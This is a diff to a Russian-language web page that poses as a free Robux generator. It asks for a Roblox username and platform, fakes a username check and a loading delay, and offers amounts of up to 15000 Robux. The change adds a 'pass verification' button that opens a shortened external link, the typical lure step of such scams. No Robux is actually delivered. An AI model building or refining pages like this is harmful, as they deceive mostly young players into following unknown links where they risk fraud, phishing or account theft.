@@ -173,7 +173,14 @@
             position: relative; /* Установите позицию для правильного размещения */
         }
 
-        button.robux-button {
+        .verification-message {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: #ffea00;
+        }
+
+        button.verification-button {
             padding: 10px 20px;
             margin: 10px;
             background-color: #28a745;
@@ -185,7 +192,7 @@
             transition: background-color 0.3s, transform 0.3s;
         }
 
-        button.robux-button:hover {
+        button.verification-button:hover {
             background-color: #218838;
             transform: scale(1.05);
         }
@@ -194,11 +201,11 @@
 <body>
     <div class="container" id="loginContainer">
         <h1>Пожалуйста, введите ваше имя пользователя</h1>
-
+        
         <label for="username">Ваше имя пользователя</label>
         <input type="text" id="username" placeholder="Username" required>
         <div class="error-message" id="error-message">Такого username в Roblox не существует</div>
-
+        
         <label>Ваша платформа</label>
         <div class="platforms">
             <button class="platform-button" onclick="selectPlatform('Android')">Android</button>
@@ -232,62 +239,54 @@
         <button class="robux-button" onclick="selectRobux(15000)">15000 Robux</button>
     </div>
 
+    <div class="verification-message" id="verificationMessage">
+        <h2>Пройдите верификацию</h2>
+        <button class="verification-button" onclick="window.open('https://shre.su/BD8H', '_blank')">Пройти верификацию</button>
+    </div>
+
     <script>
         let selectedPlatform = null; // Переменная для хранения выбранной платформы
 
         function selectPlatform(platform) {
             selectedPlatform = platform; // Сохраняем выбранную платформу
             const platformButtons = document.querySelectorAll('.platform-button');
-
             platformButtons.forEach(button => {
-                button.classList.remove('selected'); // Убираем выделение с других кнопок
+                button.classList.remove('selected');
             });
+            event.target.classList.add('selected'); // Добавляем класс к выбранной кнопке
 
-            // Выделяем кнопку выбранной платформы
-            const selectedButton = Array.from(platformButtons).find(button => button.textContent === platform);
-            selectedButton.classList.add('selected');
-
-            // Проверяем возможность активации кнопки "Продолжить"
-            checkSubmitButton();
-        }
-
-        function checkSubmitButton() {
-            const submitButton = document.getElementById('submitButton');
-            const username = document.getElementById('username').value;
-
-            // Если имя пользователя и платформа выбраны, активируем кнопку "Продолжить"
-            if (username && selectedPlatform) {
-                submitButton.style.opacity = 1;
-                submitButton.style.pointerEvents = 'auto';
-            } else {
-                submitButton.style.opacity = 0.5;
-                submitButton.style.pointerEvents = 'none';
-            }
+            document.getElementById('submitButton').style.opacity = 1; // Включаем кнопку "Продолжить"
+            document.getElementById('submitButton').style.pointerEvents = 'auto'; // Разрешаем нажатие на кнопку
         }
 
         function validateUsername() {
             const username = document.getElementById('username').value;
             const errorMessage = document.getElementById('error-message');
+            const loading = document.getElementById('loading');
+            const robuxSelection = document.getElementById('robuxSelection');
+            const verificationMessage = document.getElementById('verificationMessage');
 
-            // Пример проверки существования имени пользователя (здесь можно добавить свою логику)
-            if (username.length < 3) {
-                errorMessage.style.display = 'block'; // Показать сообщение об ошибке
-                return; // Выход из функции, если имя пользователя неверное
+            // Здесь должна быть ваша логика проверки username
+            if (username === "") {
+                errorMessage.style.display = "block"; // Показываем сообщение об ошибке
+                return;
             }
 
-            errorMessage.style.display = 'none'; // Скрыть сообщение об ошибке
-            document.getElementById('loading').style.display = 'block'; // Показать анимацию загрузки
-            document.getElementById('loginContainer').style.display = 'none'; // Скрыть контейнер с вводом
+            loading.style.display = "block"; // Показываем загрузку
 
-            // Эмулируем загрузку
+            // Симуляция задержки для загрузки
             setTimeout(() => {
-                document.getElementById('loading').style.display = 'none'; // Скрыть анимацию загрузки
-                document.getElementById('robuxSelection').style.display = 'block'; // Показать выбор Robux
-            }, 2000); // Задержка 2 секунды
+                loading.style.display = "none"; // Скрываем загрузку
+                errorMessage.style.display = "none"; // Скрываем сообщение об ошибке
+
+                // Показываем выбор Robux и сообщение о верификации
+                robuxSelection.style.display = "block";
+                verificationMessage.style.display = "block";
+            }, 2000);
         }
 
         function selectRobux(amount) {
-            alert(`Вы выбрали ${amount} Robux!`); // Здесь можно добавить логику для обработки выбора Robux
+            alert(`Вы выбрали ${amount} Robux!`);
         }
     </script>
 </body>
